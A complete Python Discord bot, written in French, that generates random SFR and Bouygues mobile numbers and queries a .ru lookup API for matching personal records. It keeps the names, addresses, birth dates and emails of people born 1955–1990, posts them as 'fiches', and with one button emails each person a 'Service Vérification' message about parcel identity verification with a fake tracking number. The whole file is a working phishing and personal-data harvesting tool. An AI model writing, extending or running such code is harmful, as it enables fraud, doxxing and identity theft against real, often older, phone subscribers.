#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bot Discord — Génération de fiches SFR / Bouygues via BrixHub.
"""

import asyncio
import os
import random
import re
import smtplib
import threading
import time
import unicodedata
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

import discord
from discord import app_commands
from discord.ext import commands
import requests


# ─── CONFIG ────────────────────────────────────────────────
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN", "")
BRIXHUB_URL = "https://api.brixhub.ru/api/v1/search"
ANNEE_MIN = 1955
ANNEE_MAX = 1990
DELAI_BRIXHUB = 0.6
MAX_TENTATIVES = 60

MAIL_USER = os.environ.get("MAIL_USER", "")
MAIL_PASS = os.environ.get("MAIL_PASS", "")
MAIL_FROM = os.environ.get("MAIL_FROM", MAIL_USER)
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.gmail.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "465"))

RESEND_API_KEY = os.environ.get("RESEND_API_KEY", "")
RESEND_FROM = os.environ.get("RESEND_FROM", "Service Vérification <onboarding@resend.dev>")

COMPTEUR_FICHIER = "compteur.txt"
COMPTEUR_DEFAUT = 84729156

_COMPTEUR_LOCK = threading.Lock()

def _lire_compteur() -> int:
    try:
        with open(COMPTEUR_FICHIER, "r", encoding="utf-8") as f:
            return int(f.read().strip())
    except (FileNotFoundError, ValueError):
        return COMPTEUR_DEFAUT

def _ecrire_compteur(valeur: int) -> None:
    try:
        with open(COMPTEUR_FICHIER, "w", encoding="utf-8") as f:
            f.write(str(valeur))
    except OSError as e:
        print(f"[!] Impossible d'écrire {COMPTEUR_FICHIER} : {e}")

def prochain_numero_suivi() -> str:
    with _COMPTEUR_LOCK:
        num = _lire_compteur()
        _ecrire_compteur(num + 1)
    return f"MR-{num}"


# ─── TEMPLATE HTML ─────────────────────────────────────────
try:
    with open("email.html", "r", encoding="utf-8") as f:
        EMAIL_HTML_TEMPLATE = f.read()
except FileNotFoundError:
    EMAIL_HTML_TEMPLATE = "<html><body><p>Template email.html manquant.</p></body></html>"
    print("⚠️ email.html introuvable.")


# ─── VILLES PROCHES (offline) ──────────────────────────────
HUBS_MONDIAL_RELAY = {
    "paris": "Paris", "lille": "Lille", "roubaix": "Lille", "tourcoing": "Lille",
    "dunkerque": "Lille", "calais": "Lille", "lens": "Lille", "lievin": "Lille",
    "valenciennes": "Lille", "amiens": "Amiens", "beauvais": "Amiens",
    "compiegne": "Compiègne", "saint-quentin": "Saint-Quentin",
    "versailles": "Versailles", "nanterre": "Nanterre", "colombes": "Nanterre",
    "argenteuil": "Argenteuil", "montreuil": "Montreuil", "creteil": "Créteil",
    "vitry-sur-seine": "Vitry-sur-Seine", "aulnay-sous-bois": "Aulnay-sous-Bois",
    "asnieres-sur-seine": "Asnières-sur-Seine", "rueil-malmaison": "Rueil-Malmaison",
    "neuilly-sur-seine": "Neuilly-sur-Seine", "champigny-sur-marne": "Champigny-sur-Marne",
    "saint-maur-des-fosses": "Saint-Maur-des-Fossés", "pontoise": "Pontoise",
    "meaux": "Meaux", "melun": "Melun", "evreux": "Évreux",
    "rennes": "Rennes", "brest": "Brest", "quimper": "Quimper", "lorient": "Lorient",
    "vannes": "Vannes", "saint-brieuc": "Saint-Brieuc", "nantes": "Nantes",
    "saint-nazaire": "Saint-Nazaire", "angers": "Angers", "le mans": "Le Mans",
    "laval": "Laval", "caen": "Caen", "rouen": "Rouen", "le havre": "Le Havre",
    "la roche-sur-yon": "La Roche-sur-Yon", "cholet": "Cholet", "niort": "Niort",
    "la rochelle": "La Rochelle", "poitiers": "Poitiers", "tours": "Tours",
    "joue-les-tours": "Joué-lès-Tours", "blois": "Blois", "orleans": "Orléans",
    "bourges": "Bourges", "chateauroux": "Châteauroux", "vierzon": "Vierzon",
    "bordeaux": "Bordeaux", "pau": "Pau", "bayonne": "Bayonne", "tarbes": "Tarbes",
    "montauban": "Montauban", "toulouse": "Toulouse", "albi": "Albi",
    "carcassonne": "Carcassonne", "narbonne": "Narbonne", "perpignan": "Perpignan",
    "beziers": "Béziers", "montpellier": "Montpellier", "nimes": "Nîmes",
    "avignon": "Avignon", "aix-en-provence": "Aix-en-Provence",
    "marseille": "Marseille", "toulon": "Toulon", "hyeres": "Hyères",
    "frejus": "Fréjus", "cannes": "Cannes", "antibes": "Antibes",
    "nice": "Nice", "menton": "Menton", "ajaccio": "Ajaccio",
    "lyon": "Lyon", "villeurbanne": "Villeurbanne", "saint-etienne": "Saint-Étienne",
    "grenoble": "Grenoble", "valence": "Valence", "chambery": "Chambéry",
    "annecy": "Annecy", "gap": "Gap", "clermont-ferrand": "Clermont-Ferrand",
    "vichy": "Vichy", "montlucon": "Montluçon", "moulins": "Moulins",
    "roanne": "Roanne", "macon": "Mâcon", "dijon": "Dijon",
    "strasbourg": "Strasbourg", "mulhouse": "Mulhouse", "colmar": "Colmar",
    "metz": "Metz", "nancy": "Nancy", "vandoeuvre-les-nancy": "Vandœuvre-lès-Nancy",
    "besancon": "Besançon", "reims": "Reims", "troyes": "Troyes",
    "charleville-mezieres": "Charleville-Mézières", "limoges": "Limoges",
    "nevers": "Nevers",
}

def _normaliser_ville(ville: str) -> str:
    if not ville:
        return ""
    v = ville.strip().lower()
    v = unicodedata.normalize("NFKD", v).encode("ascii", "ignore").decode("ascii")
    v = re.sub(r"[\s\-']+", " ", v)
    return v.strip()

def ville_proche(ville_fiche: str) -> str:
    if not ville_fiche:
        return "—"
    cle = _normaliser_ville(ville_fiche)
    if cle in HUBS_MONDIAL_RELAY:
        return HUBS_MONDIAL_RELAY[cle]
    return ville_fiche


# ─── UTILITAIRES ───────────────────────────────────────────
def normaliser_phone(phone: str) -> str:
    p = re.sub(r"[\s\.\-\(\)]", "", str(phone).strip())
    if p.startswith("+33"):
        p = "0" + p[3:]
    elif p.startswith("0033"):
        p = "0" + p[4:]
    elif p.startswith("33") and len(p) == 11:
        p = "0" + p[2:]
    return p

def generer_numero(operateur: str) -> str:
    prefixe = random.choice(PREFIXES_PAR_OPERATEUR[operateur])
    return f"{prefixe}{random.randint(0, 999999):06d}"

def extraire_annee(date_str: str):
    if not date_str:
        return None
    m = re.search(r"(\d{4})", str(date_str))
    return int(m.group(1)) if m else None

def normaliser_operateur(txt: str) -> str:
    if not txt:
        return "inconnu"
    t = str(txt).lower()
    if "bouygues" in t or "bytel" in t or "b&you" in t:
        return "bouygues"
    if "sfr" in t or "red" in t:
        return "sfr"
    if "orange" in t:
        return "orange"
    if "free" in t:
        return "free"
    return "inconnu"

def verifier_operateur(ligne: dict, operateur_cible: str, numero: str) -> bool:
    numero_trouve = False
    for cle in ("telephone", "mobile"):
        val = ligne.get(cle)
        if val and normaliser_phone(val) == numero:
            numero_trouve = True
            break
    if not numero_trouve:
        return False
    for cle in ("operateur", "operator", "carrier", "reseau", "network"):
        val = ligne.get(cle)
        if val:
            op = normaliser_operateur(str(val))
            if op != "inconnu" and op != operateur_cible:
                return False
    source = str(ligne.get("_source_db", "")).lower()
    if source:
        op_source = normaliser_operateur(source)
        if op_source != "inconnu" and op_source != operateur_cible:
            return False
    return True

def email_valide(email: str) -> bool:
    if not email:
        return False
    return bool(re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email.strip()))


# ─── HTML ──────────────────────────────────────────────────
def construire_html_fiche(fiche: dict, numero_suivi: str) -> str:
    html = EMAIL_HTML_TEMPLATE
    remplacements = {
        "{{NOM}}":          fiche.get("nom", ""),
        "{{PRENOM}}":       fiche.get("prenom", ""),
        "{{NUMERO}}":       fiche.get("numero", ""),
        "{{OPERATEUR}}":    (fiche.get("operateur") or "").capitalize(),
        "{{ADRESSE}}":      fiche.get("adresse", ""),
        "{{CODE_POSTAL}}":  fiche.get("code_postal", ""),
        "{{VILLE}}":        fiche.get("ville", ""),
        "{{VILLE_PROCHE}}": ville_proche(fiche.get("ville", "")),
        "{{NAISSANCE}}":    fiche.get("naissance", ""),
        "{{EMAIL}}":        fiche.get("email", ""),
        "{{SOURCE}}":       fiche.get("source", ""),
        "{{DATE}}":         datetime.now().strftime("%d/%m/%Y"),
        "{{NUMERO_SUIVI}}": numero_suivi,
    }
    for token, valeur in remplacements.items():
        html = html.replace(token, str(valeur))
    return html


# ─── ENVOI EMAIL ───────────────────────────────────────────
def _envoyer_smtp_ssl(destinataire: str, sujet: str, html: str):
    if not MAIL_USER or not MAIL_PASS:
        return None
    msg = MIMEMultipart("alternative")
    msg["Subject"] = sujet
    msg["From"] = formataddr(("Service Vérification", MAIL_FROM))
    msg["To"] = destinataire
    msg.attach(MIMEText("Ce message contient du HTML.", "plain", "utf-8"))
    msg.attach(MIMEText(html, "html", "utf-8"))
    try:
        with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=30) as server:
            server.login(MAIL_USER, MAIL_PASS)
            server.sendmail(MAIL_FROM, [destinataire], msg.as_string())
        return True, "Email envoyé (SMTP SSL)."
    except Exception as e:
        return False, f"SMTP SSL : {e}"

def _envoyer_resend(destinataire: str, sujet: str, html: str):
    if not RESEND_API_KEY:
        return None
    try:
        r = requests.post(
            "https://api.resend.com/emails",
            headers={
                "Authorization": f"Bearer {RESEND_API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "from": RESEND_FROM,
                "to": [destinataire],
                "subject": sujet,
                "html": html,
            },
            timeout=30,
        )
        if r.status_code in (200, 201):
            return True, "Email envoyé (Resend)."
        return False, f"Resend {r.status_code} : {r.text[:200]}"
    except Exception as e:
        return False, f"Resend : {e}"

def envoyer_email(destinataire: str, sujet: str, html: str):
    if not email_valide(destinataire):
        return False, f"Adresse destinataire invalide : {destinataire}"
    result = _envoyer_smtp_ssl(destinataire, sujet, html)
    if result is not None and result[0]:
        return result
    smtp_error = result[1] if result else "SMTP non configuré"
    result = _envoyer_resend(destinataire, sujet, html)
    if result is not None and result[0]:
        return result
    resend_error = result[1] if result else "Resend non configuré"
    return False, f"{smtp_error} | {resend_error}"


# ─── PRÉFIXES ──────────────────────────────────────────────
PREFIXES_BOUYGUES = [
    "0650","0651","0652","0653","0654","0655","0656","0657","0658","0659",
    "0660","0661","0662","0663","0664","0665","0666","0667","0668","0669",
    "0670","0671","0672","0673","0674","0675","0676","0677","0678","0679",
    "0680","0681","0682","0683","0684","0685","0686","0687","0688","0689",
    "0690","0691","0692","0693","0694","0695","0696","0697","0698","0699",
    "0750","0751","0752","0753","0754","0755","0756","0757","0758","0759",
    "0760","0761","0762","0763","0764","0765","0766","0767","0768","0769",
    "0770","0771","0772","0773","0774","0775","0776","0777","0778","0779",
    "0780","0781","0782","0783","0784","0785","0786","0787","0788","0789",
    "0790","0791","0792","0793","0794","0795","0796","0797","0798","0799",
]
PREFIXES_SFR = [
    "0600","0601","0602","0603","0604","0605","0606","0607","0608","0609",
    "0610","0611","0612","0613","0614","0615","0616","0617","0618","0619",
    "0620","0621","0622","0623","0624","0625","0626","0627","0628","0629",
    "0630","0631","0632","0633","0634","0635","0636","0637","0638","0639",
    "0640","0641","0642","0643","0644","0645","0646","0647","0648","0649",
    "0730","0731","0732","0733","0734","0735","0736","0737","0738","0739",
    "0740","0741","0742","0743","0744","0745","0746","0747","0748","0749",
]
PREFIXES_PAR_OPERATEUR = {"bouygues": PREFIXES_BOUYGUES, "sfr": PREFIXES_SFR}


# ─── BRIXHUB ───────────────────────────────────────────────
def chercher_par_telephone(phone: str) -> list:
    try:
        r = requests.post(
            BRIXHUB_URL,
            json={"telephone": phone, "per_page": 100},
            headers={"Content-Type": "application/json"},
            timeout=30,
        )
    except requests.exceptions.RequestException:
        return []
    if r.status_code != 200:
        return []
    try:
        body = r.json()
    except ValueError:
        return []
    return body.get("data", {}).get("results", [])

def chercher_fiche_valide(operateur: str):
    for tentative in range(1, MAX_TENTATIVES + 1):
        numero = generer_numero(operateur)
        results = chercher_par_telephone(numero)
        time.sleep(DELAI_BRIXHUB)
        for ligne in results:
            if not verifier_operateur(ligne, operateur, numero):
                continue
            nom = (ligne.get("nom_famille") or "").strip()
            prenom = (ligne.get("prenom") or "").strip()
            adresse = (ligne.get("adresse") or "").strip()
            cp = (ligne.get("code_postal") or "").strip()
            date_n = (ligne.get("date_naissance") or "").strip()
            if not all([nom, prenom, adresse, cp, date_n]):
                continue
            annee = extraire_annee(date_n)
            if annee is None or not (ANNEE_MIN <= annee <= ANNEE_MAX):
                continue
            return {
                "numero": numero,
                "operateur": operateur,
                "nom": nom,
                "prenom": prenom,
                "naissance": date_n,
                "adresse": adresse,
                "code_postal": cp,
                "ville": (ligne.get("ville") or "").strip(),
                "email": (ligne.get("email") or "").strip(),
                "source": (ligne.get("_source_db") or "").strip(),
                "tentative": tentative,
            }
    return None


# ─── EMBED ─────────────────────────────────────────────────
def construire_embed_fiche(fiche: dict) -> discord.Embed:
    couleur = 0x2ECC71 if fiche["operateur"] == "bouygues" else 0xE74C3C
    embed = discord.Embed(
        title=f"📋 Fiche {fiche['operateur'].upper()}",
        description=f"Numéro **{fiche['numero']}** — Opérateur **{fiche['operateur'].capitalize()}**",
        color=couleur,
    )
    embed.add_field(name="Nom", value=fiche["nom"], inline=True)
    embed.add_field(name="Prénom", value=fiche["prenom"], inline=True)
    embed.add_field(name="Naissance", value=fiche["naissance"], inline=True)
    embed.add_field(name="Adresse", value=fiche["adresse"], inline=False)
    embed.add_field(name="Code postal", value=fiche["code_postal"], inline=True)
    embed.add_field(name="Ville", value=fiche["ville"] or "—", inline=True)
    if fiche["email"]:
        embed.add_field(name="Email", value=fiche["email"], inline=False)
    embed.add_field(name="Source", value=fiche["source"] or "—", inline=False)
    embed.set_footer(text=f"Trouvée en {fiche['tentative']} tentative(s) • BrixHub")
    return embed


# ─── VUE FICHE ─────────────────────────────────────────────
class FicheView(discord.ui.View):
    def __init__(self, fiche: dict):
        super().__init__(timeout=None)
        self.fiche = fiche
        if not email_valide(fiche.get("email", "")):
            self.btn_email.disabled = True

    @discord.ui.button(
        label="Envoyer un email",
        style=discord.ButtonStyle.primary,
        emoji="📧",
        custom_id="btn_envoyer_email",
    )
    async def btn_email(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            destinataire = self.fiche.get("email", "").strip()
            if not email_valide(destinataire):
                await interaction.response.send_message(
                    "❌ Email de la fiche invalide ou manquant.", ephemeral=True
                )
                return
            await interaction.response.defer(ephemeral=True, thinking=True)
            numero_suivi = prochain_numero_suivi()
            sujet = f"Récapitulatif de votre vérification d'identité - Colis {numero_suivi}"
            loop = asyncio.get_event_loop()
            html = await loop.run_in_executor(
                None, construire_html_fiche, self.fiche, numero_suivi
            )
            ok, msg = await loop.run_in_executor(
                None, envoyer_email, destinataire, sujet, html
            )
            if ok:
                await interaction.followup.send(
                    f"✅ Email envoyé à **{destinataire}**\n"
                    f"📨 Sujet : `{sujet}`\n"
                    f"ℹ️ {msg}",
                    ephemeral=True,
                )
            else:
                await interaction.followup.send(f"❌ Échec : {msg}", ephemeral=True)
        except Exception as e:
            print(f"[!] Erreur bouton email : {type(e).__name__}: {e}")
            try:
                await interaction.followup.send(
                    f"❌ Erreur interne : {type(e).__name__}", ephemeral=True
                )
            except Exception:
                pass


# ─── VUE CHOIX ─────────────────────────────────────────────
class ChoixOperateurView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    async def _lancer_recherche(self, interaction: discord.Interaction, operateur: str):
        for child in self.children:
            child.disabled = True
        try:
            await interaction.response.edit_message(view=self)
        except discord.errors.InteractionResponded:
            pass
        await interaction.followup.send(
            f"🔎 Recherche d'une fiche **{operateur.upper()}** en cours…",
            ephemeral=True,
        )
        loop = asyncio.get_event_loop()
        fiche = await loop.run_in_executor(None, chercher_fiche_valide, operateur)
        if not fiche:
            await interaction.followup.send(
                f"❌ Aucune fiche **{operateur.upper()}** valide trouvée. Réessaie.",
                ephemeral=True,
            )
            for child in self.children:
                child.disabled = False
            try:
                await interaction.edit_original_response(view=self)
            except Exception:
                pass
            return
        await interaction.followup.send(
            embed=construire_embed_fiche(fiche),
            view=FicheView(fiche),
        )
        await interaction.followup.send(f"`{fiche['numero']}`")
        embed_boutons = discord.Embed(
            title="🔁 Générer une autre fiche",
            description="Clique sur un opérateur pour relancer une recherche.",
            color=0x95A5A6,
        )
        await interaction.followup.send(
            embed=embed_boutons,
            view=ChoixOperateurView(),
        )

    @discord.ui.button(label="SFR", style=discord.ButtonStyle.danger,
                       emoji="📱", custom_id="btn_sfr")
    async def bouton_sfr(self, interaction, button):
        await self._lancer_recherche(interaction, "sfr")

    @discord.ui.button(label="Bouygues", style=discord.ButtonStyle.success,
                       emoji="📱", custom_id="btn_bouygues")
    async def bouton_bouygues(self, interaction, button):
        await self._lancer_recherche(interaction, "bouygues")


# ─── BOT ───────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.tree.command(name="start", description="Générateur de fiches SFR / Bouygues")
async def start(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🤖 Générateur de fiches",
        description=(
            "Choisis l'opérateur avec les boutons ci-dessous.\n\n"
            "**Critères appliqués :**\n"
            "• Nom, prénom, adresse, code postal obligatoires\n"
            f"• Naissance entre **{ANNEE_MIN}** et **{ANNEE_MAX}**\n"
            "• Numéro vérifié côté BrixHub\n"
            "• Le bot régénère automatiquement jusqu'à trouver une fiche valide"
        ),
        color=0x3498DB,
    )
    embed.set_footer(text="Clique sur SFR ou Bouygues pour générer une fiche")
    await interaction.response.send_message(embed=embed, view=ChoixOperateurView())

@bot.event
async def on_ready():
    print(f"[✓] Connecté en tant que {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"[✓] {len(synced)} commande(s) synchronisée(s)")
    except Exception as e:
        print(f"[!] Erreur sync : {e}")

if __name__ == "__main__":
    if not DISCORD_TOKEN:
        print("❌ DISCORD_TOKEN manquant.")
    else:
        bot.run(DISCORD_TOKEN)